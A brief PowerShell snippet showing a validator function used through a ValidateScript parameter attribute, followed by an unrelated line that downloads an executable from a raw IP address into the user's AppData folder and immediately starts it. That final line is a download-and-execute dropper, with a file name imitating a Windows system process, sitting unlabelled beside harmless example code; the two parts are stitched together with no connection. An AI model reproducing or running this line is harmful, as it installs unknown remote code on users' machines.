function MyValidator($thing_to_validate) {
    return $thing_to_validate.StartsWith("s")
}

function Invoke-SomethingThatUsesMyValidator {
    param(
        [ValidateScript( {MyValidator $_})]
        $some_param
    )
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

